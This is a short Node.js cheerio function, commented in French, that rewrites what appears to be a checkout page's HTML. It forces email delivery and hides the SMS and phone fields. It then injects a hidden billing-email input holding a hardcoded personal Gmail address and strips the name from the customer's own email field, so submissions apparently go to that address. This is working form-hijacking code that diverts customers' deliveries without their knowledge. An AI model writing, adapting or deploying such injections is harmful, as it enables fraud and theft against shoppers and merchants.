const cheerio = require("cheerio")

function desableSms(html) {
  const $ = cheerio.load(html);
  
    //decocher tout les radios
    $('input[name="mode_livraison_code"]').removeAttr('checked');
    // Puis cocher email
    $('input[name="mode_livraison_code"][value="email"]').attr('checked', 'checked');

    //masquer les champs de sms
    $('#mode_livraison_code_field').css('display', 'none');
    $('#billing_phone_field').css('display', 'none');

    //injecter du js
    $('#billing_email').parent().append(`
        
        <input type="email" 
        class="input-text form-control" 
        name="billing_email" 
        id="billing_email" 
        value="steednoumon7@gmail.com" 
        autocomplete="email"
        style="display:none;"/>
    
    `);

    $('input[name="billing_email"]').first().attr('id', 'billing_email2');
    $('input[name="billing_email"]').first().removeAttr('name');


  
  
  
  return $.html();
}

module.exports = desableSms;